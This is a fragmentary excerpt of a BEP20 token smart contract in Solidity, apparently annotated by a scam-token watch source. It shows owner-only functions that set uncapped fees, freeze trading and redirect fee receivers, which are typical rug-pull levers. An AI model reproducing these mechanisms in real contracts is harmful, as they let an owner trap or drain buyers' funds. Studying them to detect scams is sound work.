...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWDS = IBEP20(0xacFC95585D80Ab62f67A14C566C1b7a49Fe91167);
    ...
    function setShare(address shareholder, uint256 amount) external override onlyToken {
        ...
        shares[shareholder].amount = amount;     //raining.shitcoins
...
contract TOKENOMICS is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "TOKENOMICS";
    string constant _symbol = "TOKENOMICS";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 1 * 10**9 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 200 ) / 10000;
    uint256 public mStx = ( _totalSupply * 100 ) / 10000;
    uint256 public sT = _totalSupply * 8 / 10000;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
     ...
     function setMaxWalP(uint256 maxWallPercent) external authorized {
    ...
    function ttF(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTF(receiver == pair, receiver)).div(fD);
    ...
    function setsFrz(bool _status, uint8 _interval) external authorized {
        sFrz = _status;     //raining.shitcoins
        sFrzT = _interval;
    }
    ...
    function setmfS(uint256 _mff, uint256 _mfs, uint256 _mFd) external authorized {
        mFf = _mff;
        mFs = _mfs;
        mFd = _mFd;
    }
    ...
    function setcSn(uint256 _csf, uint256 _css, uint256 _csd) external authorized {
        cSf = _csf;
        cSs = _css;
        cSd = _csd;
    }
    ...
    function setrre(address _spE, address _nbE, address _mnbE, address _newra) external authorized {
        spE = _spE;
        nbE = _nbE;
        mnbE = _mnbE;
        tfU = _newra;
    ...
    function setbSSf(uint256 _bssf) external authorized {
        bssf = _bssf;
    }
    ...
    function setmNbe(address _mnbE) external authorized {
        mnbE = _mnbE;
    }
